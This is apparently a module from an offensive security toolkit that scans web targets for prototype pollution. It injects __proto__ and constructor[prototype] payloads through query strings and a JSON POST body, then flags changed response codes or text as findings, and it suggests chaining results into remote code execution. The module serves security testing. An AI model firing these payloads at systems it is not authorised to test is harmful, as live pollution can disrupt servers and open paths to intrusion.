"""omega/offensive/offense/protopollute — prototype pollution hunter.

Node stacks: inject __proto__ shapes through query/body and then
check for gadget effects (response status/text mutated by polluted
keys). OFFENSE-GATED (PTK_OFFENSE). Candidate-grade.
"""
import json
import os

__all__ = ["run_protopollute"]

PAYLOAD_SHAPES = [
    "?__proto__[status]=510&__proto__[statusText]=OMEGAPP",
    "?__proto__[test]=OMEGAPP",
    "?constructor[prototype][status]=510",
    "?__proto__.status=510",
]

GADGET_PROBES = [
    ("status-mutation", "510"),
    ("text-mutation", "OMEGAPP"),
]


def run_protopollute(target, fetch, log=None, gate_open_fn=None):
    """Inject pollution shapes, look for gadget-observable changes."""
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    if not callable(fetch):
        return {"note": "fetch adapter required"}
    findings = []
    probes = 0
    for shape in PAYLOAD_SHAPES:
        try:
            resp = fetch(str(target) + shape)
            probes += 1
        except Exception:
            continue
        st = getattr(resp, "status", 0)
        body = (resp if isinstance(resp, str) else
                getattr(resp, "text", "") or "")
        # gadget evidence: polluted key visibly changed behavior
        if st == 510 or "OMEGAPP" in body:
            findings.append({
                "title": "prototype pollution candidate: gadget effect "
                         "observable",
                "severity": "HIGH",
                "source": "protopollute/gadget",
                "evidence": f"shape {shape.split('&')[0]}... produced "
                            f"observable pollution effect "
                            f"(status {st}, body len {len(body)})",
                "location": str(target),
                "verification": "candidate",
                "manual_check": "chain the polluted key into a real "
                                "gadget (RCE/security-bypass) to "
                                "confirm impact",
                "cwe": "CWE-1321",
            })
            break
    # JSON body shape via POST (mass-assignment style)
    try:
        resp = fetch(str(target), method="POST",
                     body=json.dumps({"__proto__": {"status": 510}}))
        probes += 1
        body = (resp if isinstance(resp, str) else
                getattr(resp, "text", "") or "")
        if getattr(resp, "status", 0) == 510 or "OMEGAPP" in body:
            findings.append({
                "title": "prototype pollution via JSON body accepted",
                "severity": "HIGH",
                "source": "protopollute/json-body",
                "evidence": "POST __proto__ object mutated response",
                "location": str(target),
                "verification": "candidate",
                "manual_check": "confirm gadget chaining for impact",
                "cwe": "CWE-1321",
            })
    except Exception:
        pass
    if log:
        log(f"protopollute: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
